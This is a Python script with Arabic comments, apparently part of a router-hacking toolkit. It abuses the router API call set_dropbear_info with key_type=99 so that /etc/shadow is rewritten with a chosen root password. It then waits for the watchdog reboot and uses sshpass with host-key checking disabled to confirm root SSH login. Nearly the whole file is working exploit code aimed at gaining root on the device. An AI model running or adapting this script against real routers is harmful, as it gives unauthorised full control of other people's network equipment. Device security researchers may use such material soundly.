#!/usr/bin/env python3
"""
Phase root-shell: ضبط كلمة سر root عبر set_dropbear_info
(يعيد كتابة /etc/shadow عبر change_ssh_key.sh ثم watchdog reboot).
بعدها نتحقق من تسجيل دخول root عبر SSH.
"""
import sys, time, socket
sys.path.insert(0, ".")
import api_login as a
from api_ssh import set_dropbear_info, wait_for_reboot, check_ssh_port

KNOW_PASS = "R291root2026"  # كلمة سر root التي نريدها

def port_open(ip, port, t=3):
    try:
        s = socket.create_connection((ip, port), t); s.close(); return True
    except Exception:
        return False

def main():
    a.login()
    print(f"[*] سأرسل set_dropbear_info بـ key_type=99، password={KNOW_PASS}")
    print("    ⚠ حسب التوثيق: قد يعلق HTTP server ويعيد الواتشدوغ تشغيل الراوتر")
    info = set_dropbear_info(user="root", password=KNOW_PASS, mode="1", key_type="99")
    print(f"[*] الرد: {info['response'][:120] if info['response'] else '(لارد — يعلق كما هو متوقع)'}")

    print("[*] انتظار إعادة التشغيل (watchdog)...")
    wr = wait_for_reboot(200)
    print(f"    {wr}")
    if not wr['success']:
        print("[-] لم يعد الراوتر؟ جر اتصال SSH مباشرة.")

    # إعادة تسجيل الدخول وتأكيد الإعدادات
    time.sleep(3)
    a.CGISID = None
    a.login()
    db = a.api_call("router", "get_dropbear_info")
    print(f"[*] get_dropbear_info بعد الإعادة: {db}")

    # فحص منفذ SSH
    ssh = check_ssh_port()
    print(f"[*] منفذ 22: {'مفتوح' if ssh.get('open') else 'مغلق'} — {ssh.get('banner')}")

    # تجربة تسجيل دخول root
    print(f"[*] جارٍ اختبار ssh root@{a.ROUTER_IP} ...")
    try:
        import subprocess
        r = subprocess.run(["sshpass", "-p", KNOW_PASS, "ssh", "-o", "StrictHostKeyChecking=no",
                            "-o", "UserKnownHostsFile=/dev/null", "-o", "ConnectTimeout=6",
                            "-o", "BatchMode=yes",
                            f"root@{a.ROUTER_IP}", "id"],
                           capture_output=True, text=True, timeout=15)
        print("STDOUT:", r.stdout)
        print("STDERR:", r.stderr[:300])
        if r.returncode == 0 and "uid=0" in r.stdout:
            print("\n✅ ✅ ✅ نجحت! دخلت الراوتر كـ root عبر SSH كلمة السر:", KNOW_PASS)
            return True
        print("[-] فشل تسجيل الدخول")
    except Exception as e:
        print("[-] استثناء SSH:", e)
    return False

if __name__ == "__main__":
    ok = main()
    sys.exit(0 if ok else 1)
